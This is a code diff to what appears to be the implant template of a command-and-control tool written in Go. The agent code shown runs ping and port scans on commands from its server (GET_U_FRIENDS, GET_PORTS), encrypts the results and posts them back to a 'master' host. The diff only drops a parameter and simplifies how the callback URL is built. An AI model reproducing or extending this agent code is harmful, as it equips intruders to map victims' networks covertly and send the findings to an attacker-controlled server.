@@ -370,7 +370,7 @@ func send() { //发送头部信息
             }
             return port_list
         }
-        func scan_u_firends(ip, portList, delay, choice, option string) {
+        func scan_u_firends(ip, portList, delay, option string) {
             var resultBuilder strings.Builder
             var mutex sync.Mutex
             var open_ports, re_url string
@@ -408,11 +408,7 @@ func send() { //发送头部信息
                 "/*uid*/":    uid,
                 "/*result*/": encrypted_data,
             }
-            if choice == "save" {
-                re_url = protocol + master + "//*Path*/?/*option*/=/*_net*/"
-            } else {
-                re_url = protocol + master + "//*Path*/?/*option*/=/*result*/"
-            }
+            re_url = protocol + master + "//*Path*/?/*option*/=/*_net*/"
             post(data, re_url)
         }
         func scan_port(ip, port string, sleep_time int, resultBuilder *strings.Builder, mutex *sync.Mutex) {
@@ -428,9 +424,9 @@ func send() { //发送头部信息
 		    mutex.Unlock()
 		}`
         scan_func = `case "GET_U_FRIENDS":
-                        go scan_u_firends(msg[1], msg[2], msg[3], msg[4], "ping")
+                        go scan_u_firends(msg[1], msg[2], msg[3], "ping")
                     case "GET_PORTS":
-                        go scan_u_firends(msg[1], msg[2], msg[3], msg[4], "port")`
+                        go scan_u_firends(msg[1], msg[2], msg[3], "port")`
     }
 	protocol_var :="\""+protocol + "://\""
     s_server := "\""+server+"\""
